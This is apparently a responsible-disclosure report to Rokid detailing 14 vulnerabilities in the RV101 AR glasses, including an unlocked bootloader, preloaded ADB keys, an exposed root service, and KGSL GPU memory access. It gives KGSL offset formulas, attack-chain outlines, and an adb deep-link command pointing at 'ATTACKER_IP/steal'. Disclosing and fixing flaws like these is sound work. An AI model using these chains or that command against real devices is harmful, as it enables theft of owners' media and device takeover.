# Rokid Product Security Vulnerability Report

> 中文版：[Rokid_漏洞報告信件.md](Rokid_%E6%BC%8F%E6%B4%9E%E5%A0%B1%E5%91%8A%E4%BF%A1%E4%BB%B6.md)

> 📌 **Fact basis**: Whenever this document touches on facts such as device generation, kernel config, CVE status, GhostLock offsets, or product structure, [`reports/FACTS.md`](FACTS.md) is authoritative (the single authoritative fact table; in case of conflict, that table decides).


**To:** security@rokid.com  
**From:** Independent security researcher  
**Date:** 2026-02-19  
**Subject:** Notification of multiple security vulnerabilities in Rokid AR Glasses (RV101)  
**Report ID:** RKID-SEC-2026-EXT-001  
**Classification:** Restricted

---

Dear Rokid Security Team,

I am an independent information-security researcher with a long-standing focus on the security of wearable devices. I recently conducted a security assessment of the Rokid AR Glasses (model RV101) and identified multiple security vulnerabilities. In accordance with the vulnerability reporting mechanism published by your company's security center (https://global.rokid.com/pages/security-center), I am submitting this complete report in the hope of helping your company improve the security protection of its products.

This report **strictly follows the principles of responsible disclosure**; no vulnerability details will be made public before your company issues a formal security advisory.

---

## I. Affected Product and Version Information

| Item               | Details                              |
| ------------------ | --------------------------------- |
| **Product name**       | Rokid AR Glasses                  |
| **Model**           | RV101 (NEO LUNA-V2)               |
| **Firmware version**       | 1.12.009-20260109-150201          |
| **Android version**   | 12 (API 32)                       |
| **Linux kernel version** | 5.10.209-perf-gb80a8319d11b       |
| **Security patch level**   | 2024-07-05                        |
| **SoC platform**       | Qualcomm (SoC ID 579)             |
| **GPU**            | Adreno 621v1 (Chip ID: 0x6020100) |

---

## II. Vulnerability Overview

A total of **3 Critical**, **5 High**, and **6 Medium** vulnerabilities were found; they are described below grouped by severity.

| ID    | Risk level | Vulnerability name                                      | CVSS 3.1 |
| ------- | -------- | --------------------------------------------- | -------- |
| VULN-01 | 🔴 Critical  | Bootloader unlocked, Verified Boot ineffective         | 9.8      |
| VULN-02 | 🔴 Critical  | Security patch more than 19 months out of date                      | 9.1      |
| VULN-03 | 🔴 Critical  | GateServiced root-privileged network service exposed (TCP 8341) | 8.6      |
| VULN-04 | 🟠 High    | KGSL GPU driver cross-FD memory access vulnerability             | 7.8      |
| VULN-05 | 🟠 High    | TrustZoneAccessService unauthorized access             | 8.4      |
| VULN-06 | 🟠 High    | ADB persistently enabled with preloaded authorized keys leading to media data exposure    | 7.5      |
| VULN-07 | 🟠 High    | OTA authentication mechanism uses weak cryptography (MD5)                  | 7.2      |
| VULN-08 | 🟠 High    | Rokid App WebView XSS and sensitive data disclosure          | 7.5      |
| VULN-09 | 🟡 Medium    | Over-privileged privileged app (assistserver with 100+ permissions)     | 5.5      |
| VULN-10 | 🟡 Medium    | Unrestricted access to I2C devices (PMIC/display/battery management)     | 5.5      |
| VULN-11 | 🟡 Medium    | Unrestricted read access to the dmesg kernel log                      | 5.0      |
| VULN-12 | 🟡 Medium    | SecCamService secure camera service exposed without authorization          | 5.5      |
| VULN-13 | 🟡 Medium    | Camera privacy LED can be turned off by an application                     | 4.6      |
| VULN-14 | 🟡 Medium    | Application logs leak payment API key and signature           | 5.5      |

---

## III. Detailed Description of Critical Vulnerabilities

### VULN-01: Bootloader Unlocked, Verified Boot Ineffective

**CVSS score:** 9.8 (Critical)  
**CWE classification:** CWE-693 (Protection Mechanism Failure)

**Technical description:**

The device's bootloader is in an unlocked state and the verified boot state is "orange":

```
ro.boot.flash.locked = 0
ro.boot.verifiedbootstate = orange
ro.boot.vbmeta.device_state = unlocked
```

**Security impact:**

- An attacker can flash malicious firmware and implant a persistent backdoor
- The Verified Boot protection mechanism is completely ineffective
- Malicious firmware can survive a device reset
- Combined with ADB access, this can form a complete supply-chain attack

**Remediation recommendations:**

1. Lock the bootloader before mass-production devices leave the factory
2. Ensure the OTA update flow verifies vbmeta signature integrity
3. Implement a runtime integrity-checking mechanism

---

### VULN-02: Security Patch More Than 19 Months Out of Date

**CVSS score:** 9.1 (Critical)  
**CWE classification:** CWE-1104 (Use of Unmaintained Third Party Components)

**Technical description:**

The device's security patch level is 2024-07-05, more than 19 months ago. In the intervening period, Google and Qualcomm have released numerous critical security patches, including but not limited to:

| CVE ID       | Severity   | Component                   | Description                         |
| -------------- | -------- | ---------------------- | ---------------------------- |
| CVE-2024-32896 | Critical | Android Framework      | privilege escalation                     |
| CVE-2024-29748 | Critical | Kernel                 | remote code execution               |
| CVE-2024-36971 | High     | Linux Kernel net/route | UAF vulnerability (device verified affected) |
| CVE-2025-21479 | High     | Qualcomm KGSL          | GPU micronode memory corruption     |

**Remediation recommendations:**

1. Urgently release a firmware update containing the latest security patches
2. Establish a monthly, or at least quarterly, security-patch update mechanism
3. Security patches should not lag more than 90 days behind (an Android CDD compliance requirement)

---

### VULN-03: GateServiced Root-Privileged Network Service Exposed

**CVSS score:** 8.6 (High)  
**CWE classification:** CWE-250 (Execution with Unnecessary Privileges)

**Technical description:**

`GateServiced` listens on TCP port 8341 on all network interfaces with root privileges (UID 0):

```
State: LISTEN
Local Address: 0.0.0.0:8341
UID: 0 (root)
SELinux Context: u:r:tee:s0
Capabilities: 000001ffffffffff (all)
```

init.rc configuration:

```
service GateServiced /vendor/bin/GateServiced
    user root
    group root system
```

**Security impact:**

- Any device that can reach that network can attempt to connect
- Running with root privileges means that, once exploited, an attacker directly obtains the highest privileges
- It holds all Linux capabilities, so the attack surface is extremely large

**Remediation recommendations:**

1. Bind the service to 127.0.0.1 or to only the necessary network interfaces
2. Reduce the privileges the service runs with, following the principle of least privilege
3. Implement strong authentication and encryption mechanisms
4. Remove unnecessary capabilities

---

## IV. Detailed Description of High-Risk Vulnerabilities

### VULN-04: KGSL GPU Driver Cross-FD Memory Access Vulnerability

**CVSS score:** 7.8 (High)  
**CWE classification:** CWE-284 (Improper Access Control)

**Technical description:**

The Qualcomm KGSL GPU driver (`/dev/kgsl-3d0`, mode 0666) shares GPU memory page tables among multiple file descriptors within the same process. An attacker can compute the mmap offset and access, through one fd, GPU memory allocated by another fd.

**Verified PoC results:**

```
fd1 allocates memory: gpuaddr=0x4000000000
fd1 writes secret value: 0xaabbccdd11223344
fd2 reads via mmap offset=0x1000: 0xaabbccdd11223344 ✅
changes made by fd2 are visible to fd1 ✅ CONFIRMED
```

**Offset calculation formula:**

```
offset = (page_index + 1) * 0x1000
page_index = (gpuaddr - 0x4000000000) / 0x1000
```

**Security impact:**

- Bypasses the fd isolation mechanism and may enable sandbox escape
- Reads sensitive GPU data of other fds (such as ML model weights or encrypted buffers)
- Tampering with other fds' GPU data could lead to privilege escalation if combined with the GPU context of a privileged process such as SurfaceFlinger

**Additional findings:**

1. **Double mmap physical page sharing:** mapping the same GPU address multiple times maps to the same physical page; this can serve as a TOCTOU attack vector
2. **Mappings remain valid after fd close:** after the fd is closed, all 100 established mmap mappings remain readable and writable, creating a memory-disclosure risk

**Remediation recommendations:**

1. Ensure each fd has its own independent GPU memory page table
2. Restrict access permissions on `/dev/kgsl-3d0` (currently 0666; tightening is recommended)
3. Forcibly unmap all mmap mappings when the fd is closed

---

### VULN-05: TrustZoneAccessService Unauthorized Access

**CVSS score:** 8.4 (High)  
**CWE classification:** CWE-862 (Missing Authorization)

**Technical description:**

`TrustZoneAccessService` is an exported service with no permission requirements at all:

```xml
<service android:name="...TZAccessService"
    android:enabled="true"
    android:exported="true">  <!-- accessible by any app -->
```

In the allowlist configuration `/vendor/etc/ssg/tz_whitelist.json`, the `permissions` field of every TA is an empty array, including sensitive functions such as App Loader, Device Attestation, and Haven Token.

**Security impact:**

- Any third-party application can bind to and access TrustZone Trusted Applications
- The device attestation key may be obtained
- The Android security model is completely bypassed

**Remediation recommendations:**

1. Set `android:exported` to `false` or add signature-level permission protection
2. Define explicit permission requirements for each TA in the allowlist
3. Implement caller identity authentication

---

### VULN-06: ADB Persistently Enabled with Preloaded Authorized Keys Leading to Zero-Click Media Data Exposure

**CVSS score:** 4.6 (Medium), or 7.5 (High) if WiFi ADB is enabled  
**CWE classification:** CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control)

**Technical description:**

ADB is enabled by default on the device and cannot be turned off by the user:

```
persist.sys.usb.config = adb,diag
persist.vendor.adb = true
lockscreen.disabled = 1
```

More seriously, `/data/misc/adb/adb_keys` has preloaded authorized keys, including a `root@raspberrypi` key (suspected leftover factory test key).

**Verified scope of data exposure:**

| Data type       | Quantity                             | Description                                                        |
| -------------- | -------------------------------- | ----------------------------------------------------------- |
| Photos           | all                             | /sdcard/DCIM/Camera/                                        |
| Videos           | all (including 2400×1800@30fps high quality) | /sdcard/Movies/Camera/                                      |
| Screenshots       | all                             | /sdcard/Screenshots/                                        |
| Screen recordings       | all                             | /sdcard/ScreenRecorder/                                     |
| IMU sensor data | 700,000+ rows                         | gyroscope/accelerometer data accompanying every video, which can reconstruct the wearer's head-movement trajectory |

A full exfiltration takes only about 2-3 minutes (USB 3.0), with no user confirmation, no root, and without exploiting any vulnerability.

**Attack scenarios:**

- **Malicious charging cable attack:** disguising a charging station is enough to steal all media data within minutes
- **Supply-chain attack:** if the `root@raspberrypi` key is common across devices, whoever holds the private key can access all factory devices

**Remediation recommendations:**

1. **P0 urgent:** disable ADB in production firmware (remove `persist.vendor.adb=true`)
2. **P0 urgent:** clear `/data/misc/adb/adb_keys` before shipping, removing the factory test key
3. **P0 urgent:** remove the Qualcomm `diag` USB interface
4. Implement a user-confirmation mechanism for ADB connections
5. Enable USB restricted mode (charging only) by default

---

### VULN-07: OTA Authentication Mechanism Uses Weak Cryptography

**CVSS score:** 7.2 (High)  
**CWE classification:** CWE-328 (Use of Weak Hash)

**Technical description:**

The OTA update check API (`POST https://ota.rokid.com/v1/extended/ota/check`) uses the following authentication method:

1. Symmetric keys (`key` and `secret`) hard-coded in the system properties `ro.boot.key` and `ro.boot.secret`
2. The signature algorithm is a simple MD5 hash (not HMAC)
3. There is no server-side nonce; it relies only on a timestamp to prevent replay

All authentication parameters can be read through ADB, and a complete OTA API call script has already been built successfully, able to query arbitrary firmware update information and download links.

**Security impact:**

- An attacker can forge OTA requests to obtain firmware download links
- MD5 is known to have collision vulnerabilities, so signatures can be forged
- Combined with an unlocked bootloader, a malicious firmware downgrade attack can be carried out

**Remediation recommendations:**

1. Switch to HMAC-SHA256 or asymmetric signatures (RSA/ECDSA)
2. Store keys in a hardware security module (such as TrustZone) rather than in system properties
3. Implement a server-side nonce to prevent replay attacks
4. Add an expiry mechanism to firmware download links

---

### VULN-08: Rokid App WebView XSS and Sensitive Data Disclosure

**CVSS score:** 7.5 (High)  
**CWE classification:** CWE-79 (Cross-site Scripting), CWE-532 (Information Exposure Through Log Files)

**Technical description:**

**WebView XSS (verified):**

`JoyGoWebviewActivity` (JD Financial SDK) is exported and supports a BROWSABLE intent filter; it can load an arbitrary URL through the `joygorokid://open?url=` scheme and execute JavaScript:

```bash
adb shell am start -a android.intent.action.VIEW \
    -d 'joygorokid://open?url=http://ATTACKER_IP/steal'
```

**Sensitive data disclosure in logs (severe):**

The application logs (readable without root, requiring only the `READ_LOGS` permission or ADB) leak the following sensitive information:

| Leaked item                                  | Risk              |
| ----------------------------------------- | ----------------- |
| Full Alipay RPC payload (including SN and signature)    | 🔴 can forge payment requests |
| Payment AppKey: `<REDACTED_PAYMENT_APPKEY>` | 🔴 payment identity forgery   |
| Google Maps API Key                       | 🟡 billing abuse       |
| Device UTDID and fingerprint                         | 🟡 device tracking       |

**Remediation recommendations:**

1. Remove the exported attribute of `JoyGoWebviewActivity` or add URL allowlist validation
2. Thoroughly scrub sensitive information (API keys, payment parameters, authentication signatures) from logs
3. Restrict logcat access permissions

---

## V. Summary of Medium-Risk Vulnerabilities

| ID    | Vulnerability               | Description                                                                                                       | Remediation recommendation                           |
| ------- | ------------------ | ---------------------------------------------------------------------------------------------------------- | ---------------------------------- |
| VULN-09 | Over-privileged privileged app   | `com.rokid.os.sprite.assistserver` holds 100+ system permissions, including INJECT_EVENTS, MASTER_CLEAR, INSTALL_PACKAGES, etc. | review under the principle of least privilege and remove unnecessary permissions |
| VULN-10 | Unrestricted I2C devices     | `/dev/i2c-1` (mode 0666) allows access to hardware such as the PMIC (0x08), display controller (0x30), and battery IC (0x64)                      | restrict access permissions on I2C device nodes        |
| VULN-11 | Unrestricted dmesg       | `dmesg_restrict=0`; any application can read the kernel log, leaking memory addresses and security events                                       | set `kernel.dmesg_restrict=1`     |
| VULN-12 | SecCamService exposed | `exported=true` with no permission requirement; provides native JNI methods for the secure camera function                                           | set exported=false or add permission control |
| VULN-13 | Camera LED can be turned off  | The `CAMERA_DISABLE_TRANSMIT_LED` permission exists, so a malicious application can record video without the user's knowledge                                    | enforce LED-on at the hardware level              |
| VULN-14 | Logs leak payment information   | Sensitive information such as Alipay RPC, API keys, and device fingerprints is recorded in logcat                                                      | clean up all sensitive log output               |

---

## VI. Known Exploitation Methods

For the vulnerabilities covered in this report, the following exploitation paths have been verified:

### Path A: ADB Physical Access Attack Chain

```
USB physical connection → ADB auto-connects (preloaded key) → all media data exfiltrated (including IMU) → completed with zero clicks
```

### Path B: TrustZone Attack Chain

```
Ordinary app → binds TrustZoneAccessService → accesses the App Loader TA → may obtain TEE privileges
```

### Path C: KGSL GPU Attack Chain

```
/dev/kgsl-3d0 access → cross-FD memory read/write → attempt to tamper with the SurfaceFlinger GPU command buffer → potential privilege escalation
```

### Path D: OTA Downgrade Attack Chain

```
Read system properties to obtain the OTA key → forge an API request → obtain firmware → unlocked bootloader flashes malicious firmware
```

---

## VII. Recommended Remediation Priority

### First priority (recommended within 7 days)

| Item                                       | Impact                   |
| ------------------------------------------ | ---------------------- |
| Lock the bootloader                            | prevent malicious firmware from being flashed       |
| Release a security patch update (at least up to the 2025 patch level) | fix known kernel and driver vulnerabilities |
| Disable ADB in production firmware and clear preloaded keys         | prevent zero-click media exposure     |
| Restrict GateServiced's listening scope and privileges           | reduce the network attack surface         |

### Second priority (recommended within 30 days)

| Item                                                         | Impact                |
| ------------------------------------------------------------ | ------------------- |
| Fix the exported issues of TrustZoneAccessService / SecCamService | prevent unauthorized TEE access |
| Update the OTA authentication mechanism to asymmetric signatures                                | prevent firmware forgery        |
| Restrict access permissions on `/dev/kgsl-3d0` and `/dev/i2c-1`                | reduce the hardware attack surface      |
| Set `dmesg_restrict=1`                                      | prevent kernel information disclosure    |

### Third priority (recommended within 90 days)

| Item                                           | Impact              |
| ---------------------------------------------- | ----------------- |
| Comprehensively review application permissions (assistserver, Alipay, etc.) | follow the principle of least privilege  |
| Clean up sensitive information in all logs                       | prevent API key leakage |
| Enforce the camera LED at the hardware level                           | protect user privacy    |
| Establish a regular security update mechanism                           | long-term security maintenance      |

---

## VIII. Compliance Concerns

| Standard            | Impact                                                      |
| --------------- | --------------------------------------------------------- |
| **GDPR**        | AR glasses can capture images of other people; the zero-protection exposure of media data constitutes a serious personal-data risk |
| **Android CDD** | Security patches lag by more than 90 days, which does not meet Google's compliance requirements            |
| **PCI DSS**     | API keys and signatures for the payment function are leaked in logs                     |

---

## IX. Expected Disclosure Timeline

| Date       | Item                                                |
| ---------- | --------------------------------------------------- |
| 2026-02-19 | This report submitted to the Rokid security team                         |
| 2026-02-21 | Confirmation reply from your company expected (per your company's 48-hour commitment)    |
| 2026-05-19 | 90-day buffer deadline (industry standard); if not yet patched, public disclosure will be evaluated |

I undertake not to disclose vulnerability details publicly before Rokid issues a formal security advisory. If your company needs more time to remediate, I am happy to discuss a reasonable schedule by email.

---

## X. Attachments

If your company needs them, I can provide the following supplementary materials:

1. **PoC source code for each vulnerability** (including the KGSL cross-FD access and the OTA authentication cracking script, etc.)
2. **APK decompilation analysis results** (TrustZoneAccessService, SecCamService, RokidSysConfig, etc.)
3. **Complete technical analysis reports** (a separate report for each vulnerability, with reproducible steps)
4. **logcat log capture samples** (personal data already redacted)

---

## XI. Contact Information

If you have any questions or need further technical discussion, please make contact through the following:

- **Email:** [<RESEARCHER_EMAIL>]

I look forward to your prompt reply and to arranging remediation. I am very willing to cooperate in verifying the effectiveness of the fixes.

Yours sincerely,

Best regards

Independent security researcher  
2026-02-19

---

_This report was written in accordance with the principles of responsible disclosure. All testing was performed on the researcher's own device, and no third-party data was damaged or exfiltrated._
